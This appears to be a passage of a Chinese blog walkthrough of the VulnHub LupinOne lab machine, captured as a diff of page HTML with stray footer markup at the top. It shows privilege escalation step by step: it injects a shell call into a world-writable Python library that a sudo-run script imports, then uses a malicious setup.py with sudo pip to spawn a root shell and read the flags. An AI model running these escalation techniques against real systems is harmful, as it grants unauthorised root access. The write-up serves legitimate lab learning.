s=n.filter(e=>e.isIntersecting);if(s.length>0){const n=s[s.length-1],o=n.target.getAttribute("id"),t=document.querySelector(`.book-toc #TableOfContents a[href="#${o}"]`);t&&(e.forEach(e=>e.classList.remove("active")),t.classList.add("active"))}},{root:null,rootMargin:"-5% 0px -80% 0px",threshold:0});n.forEach(e=>s.observe(e))};a(),r()})</script><a href=/docs/cybersecurity/vulnhub/medium/ class=minimal-back-btn title><svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg></a><div id=cheat-video-modal><div class=close-video title=关闭>×</div><video id=cheat-video-player controls preload=auto playsinline>
-<source src=/video/cheat.mp4 type=video/mp4>您的浏览器不支持视频标签。</video></div><script>document.addEventListener("DOMContentLoaded",()=>{const e=document.getElementById("cheat-video-modal"),t=document.getElementById("cheat-video-player"),n=document.querySelector(".close-video"),o=document.querySelectorAll('a[href="#cheat"]');o.forEach(n=>{n.addEventListener("click",function(n){n.preventDefault(),e.classList.add("active"),t.volume=.5,t.load();let s=t.play();s!==0[0]&&s.then(e=>{console.log("🚀 彩蛋视频带声音播放成功！")}).catch(e=>{console.error("❌ 浏览器策略拦截:",e)})})});const s=()=>{e.classList.remove("active"),t.pause(),t.currentTime=0};n&&n.addEventListener("click",s),e&&e.addEventListener("click",function(t){t.target===e&&s()})})</script><script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#一信息搜集>一、信息搜集</a><ul><li><a href=#11-端口扫描>1.1 端口扫描</a></li><li><a href=#12-目录扫描>1.2 目录扫描</a></li></ul></li><li><a href=#二信息解密和爆破>二、信息解密和爆破</a></li><li><a href=#三ssh登录>三、SSH登录</a></li><li><a href=#四水平越权>四、水平越权</a><ul><li><ul><li><a href=#41-找漏洞>4.1 找漏洞</a></li><li><a href=#42-漏洞利用文件源码中添加命令行>4.2 漏洞利用：文件源码中添加命令行</a></li></ul></li></ul></li><li><a href=#五提权>五、提权</a></li></ul></nav></div></aside></main></body></html>
+发现<code>user.txt</code>，获得第一个flag<code>3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}</code></p>
+<h1 id="四水平越权">四、水平越权<a class="anchor" href="#%e5%9b%9b%e6%b0%b4%e5%b9%b3%e8%b6%8a%e6%9d%83">#</a></h1>
+<h3 id="41-找漏洞">4.1 找漏洞<a class="anchor" href="#41-%e6%89%be%e6%bc%8f%e6%b4%9e">#</a></h3>
+<p>使用<code>sudo -l</code>发现查看过<code>heist.py</code>这一文件，</p>
+<p>命令1，<code>uid=1001(icex64)</code>说明现在是普通用户</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>icex64@LupinOne:~$ id
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">uid</span><span style="color:#ff6ac1">=</span>1001<span style="color:#ff6ac1">(</span>icex64<span style="color:#ff6ac1">)</span> <span style="color:#ff5c57">gid</span><span style="color:#ff6ac1">=</span>1001<span style="color:#ff6ac1">(</span>icex64<span style="color:#ff6ac1">)</span> <span style="color:#ff5c57">groups</span><span style="color:#ff6ac1">=</span>1001<span style="color:#ff6ac1">(</span>icex64<span style="color:#ff6ac1">)</span></span></span></code></pre></div><p>命令2，<code>(arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py</code>说明可以以arsene身份无密码执行<code>python3.9 /home/arsene/heist.py</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>icex64@LupinOne:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#ff6ac1">for</span> icex64 on LupinOne:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, <span style="color:#ff5c57">secure_path</span><span style="color:#ff6ac1">=</span>/usr/local/sbin<span style="color:#5af78e">\:</span>/usr/local/bin<span style="color:#5af78e">\:</span>/usr/sbin<span style="color:#5af78e">\:</span>/usr/bin<span style="color:#5af78e">\:</span>/sbin<span style="color:#5af78e">\:</span>/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User icex64 may run the following commands on LupinOne:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">(</span>arsene<span style="color:#ff6ac1">)</span> NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py</span></span></code></pre></div><p>命令3，查看<code>heist.py</code>内容，它导入<code>webbrowsr</code>模块，打印一句话，接着调用<code>webbrowser.open()</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>icex64@LupinOne:~$ <span style="color:#ff5c57">cd</span> /home/arsene
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>icex64@LupinOne:/home/arsene$ cat heist.py
+</span></span><span style="display:flex;"><span>import webbrowser
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print <span style="color:#ff6ac1">(</span><span style="color:#5af78e">&#34;Its not yet ready to get in action&#34;</span><span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>webbrowser.open<span style="color:#ff6ac1">(</span><span style="color:#5af78e">&#34;https://empirecybersecurity.co.mz&#34;</span><span style="color:#ff6ac1">)</span></span></span></code></pre></div><p>命令4，循着上面的思路，寻找名为<code>webbrowser的文件</code>，找到了两个相关的，第一个的<code>.py</code>文件直接相关</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>icex64@LupinOne:/home/arsene$ find /usr/ -name *webbrowser*
+</span></span><span style="display:flex;"><span>/usr/lib/python3.9/webbrowser.py
+</span></span><span style="display:flex;"><span>/usr/lib/python3.9/__pycache__/webbrowser.cpython-39.pyc</span></span></code></pre></div><p>命令5，这个文件权限是<code>777</code>，任何人都可以修改，这是漏洞点</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>icex64@LupinOne:/home/arsene$ ls -al /usr/lib/python3.9/webbrowser.py
+</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#ff9f43">1</span> root root <span style="color:#ff9f43">24087</span> Oct  <span style="color:#ff9f43">4</span>  <span style="color:#ff9f43">2021</span> /usr/lib/python3.9/webbrowser.py</span></span></code></pre></div><h3 id="42-漏洞利用文件源码中添加命令行">4.2 漏洞利用：文件源码中添加命令行<a class="anchor" href="#42-%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e6%96%87%e4%bb%b6%e6%ba%90%e7%a0%81%e4%b8%ad%e6%b7%bb%e5%8a%a0%e5%91%bd%e4%bb%a4%e8%a1%8c">#</a></h3>
+<p>接着修改webbrowser.py文件，添加一行启动bash窗口的命令，接着用<code>arsene</code>账户调用<code>heist.py</code>，获取arsene权限</p>
+<p>按o进入插入模式并在新的一行输入，os.system(&quot;/bin/bash&quot;)，按esc，再:wq保存退出</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#ff5c57">cd</span> /usr/lib/python3.9
+</span></span><span style="display:flex;"><span>vi webbrowser.py</span></span></code></pre></div><p>以<code>arsene</code>身份，执行<code>heist.py</code>文件，整个进程身份变成<code>arsene</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>icex64@LupinOne:/usr/lib/python3.9$ sudo -u arsene python3.9 /home/arsene/heist.py
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>arsene@LupinOne:/usr/lib/python3.9$ id
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">uid</span><span style="color:#ff6ac1">=</span>1000<span style="color:#ff6ac1">(</span>arsene<span style="color:#ff6ac1">)</span> <span style="color:#ff5c57">gid</span><span style="color:#ff6ac1">=</span>1000<span style="color:#ff6ac1">(</span>arsene<span style="color:#ff6ac1">)</span> <span style="color:#ff5c57">groups</span><span style="color:#ff6ac1">=</span>1000<span style="color:#ff6ac1">(</span>arsene<span style="color:#ff6ac1">)</span>,24<span style="color:#ff6ac1">(</span>cdrom<span style="color:#ff6ac1">)</span>,25<span style="color:#ff6ac1">(</span>floppy<span style="color:#ff6ac1">)</span>,29<span style="color:#ff6ac1">(</span>audio<span style="color:#ff6ac1">)</span>,30<span style="color:#ff6ac1">(</span>dip<span style="color:#ff6ac1">)</span>,44<span style="color:#ff6ac1">(</span>video<span style="color:#ff6ac1">)</span>,46<span style="color:#ff6ac1">(</span>plugdev<span style="color:#ff6ac1">)</span>,109<span style="color:#ff6ac1">(</span>netdev<span style="color:#ff6ac1">)</span></span></span></code></pre></div><h1 id="五提权">五、提权<a class="anchor" href="#%e4%ba%94%e6%8f%90%e6%9d%83">#</a></h1>
+<p>查看当前用户可用sudo执行什么</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>arsene@LupinOne:/usr/lib/python3.9$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#ff6ac1">for</span> arsene on LupinOne:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, <span style="color:#ff5c57">secure_path</span><span style="color:#ff6ac1">=</span>/usr/local/sbin<span style="color:#5af78e">\:</span>/usr/local/bin<span style="color:#5af78e">\:</span>/usr/sbin<span style="color:#5af78e">\:</span>/usr/bin<span style="color:#5af78e">\:</span>/sbin<span style="color:#5af78e">\:</span>/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User arsene may run the following commands on LupinOne:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">(</span>root<span style="color:#ff6ac1">)</span> NOPASSWD: /usr/bin/pip</span></span></code></pre></div><p>发现可以用root身份执行pip命令，那么用pip的root权限安装一个shell的程序</p>
+<p>先创建一个伪装称python包的目录，接着安装当前目录里的python包
+而echo语句中，</p>
+<ul>
+<li>os.execl理解：<code>os.execl()</code>是用新程序替换当前进程，即pip进行→变成root shell</li>
+<li>参数理解：<code>'/bin/sh'</code>要执行的程序，<code>'sh'</code>程序名，<code>'-c'</code>执行后面的命令，<code> 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)'</code>重定向输入输出</li>
+<li>长参数理解：<code>sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)</code>是让shell正确绑定当前终端，<code>&lt;$(tty)</code>把输入连接到当前终端，<code>&gt;$(tty)</code>把输出连接到当前终端，<code>2&gt;$(tty)</code>把错误输出连接到当前终端</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>mkdir upfine
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cd</span> upfine
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">echo</span> <span style="color:#5af78e">&#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;</span><span style="color:#ff6ac1">$(</span>tty<span style="color:#ff6ac1">)</span><span style="color:#5af78e"> &gt;</span><span style="color:#ff6ac1">$(</span>tty<span style="color:#ff6ac1">)</span><span style="color:#5af78e"> 2&gt;</span><span style="color:#ff6ac1">$(</span>tty<span style="color:#ff6ac1">)</span><span style="color:#5af78e">&#39;)&#34;</span> &gt; setup.py
+</span></span><span style="display:flex;"><span>sudo pip install .</span></span></code></pre></div><p>接着</p>
+<pre tabindex="0"><code>id
+ls
+cd /root
+ls
+cat root.txt</code></pre><p>获得flag<code>3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}</code></p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+<a class="flex align-center" href="https://github.com/vnccer/vnccer.github.io/commit/090b0eea1800094030cbc586f5bb3d0540bc1cd4" title='Last modified by vnccer | March 11, 2026' target="_blank" rel="noopener">
+    <img src="/icons/calendar.svg" class="book-icon" alt="Calendar" />
+    <span>March 11, 2026</span>
+  </a>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+
+
+
+
+  
+  
+  
+  <div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-The-planets_earth/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>The planets earth</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/cybersecurity/CTF/easy/CTF-web-low/" class="flex align-center">
+        <span>web-low</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
+  
+
+
+ 
+        
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+        
+        
+  
+  <div class="book-copyright flex justify-center">
+    <small>vnccer - <a href="https://creativecommons.org/licenses/by/4.0/legalcode">© CC BY 4.0</a></small>
+  </div>
+  
+ 
+        
+  
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#一信息搜集">一、信息搜集</a>
+      <ul>
+        <li><a href="#11-端口扫描">1.1 端口扫描</a></li>
+        <li><a href="#12-目录扫描">1.2 目录扫描</a></li>
+      </ul>
+    </li>
+    <li><a href="#二信息解密和爆破">二、信息解密和爆破</a></li>
+    <li><a href="#三ssh登录">三、SSH登录</a></li>
+    <li><a href="#四水平越权">四、水平越权</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#41-找漏洞">4.1 找漏洞</a></li>
+            <li><a href="#42-漏洞利用文件源码中添加命令行">4.2 漏洞利用：文件源码中添加命令行</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#五提权">五、提权</a></li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
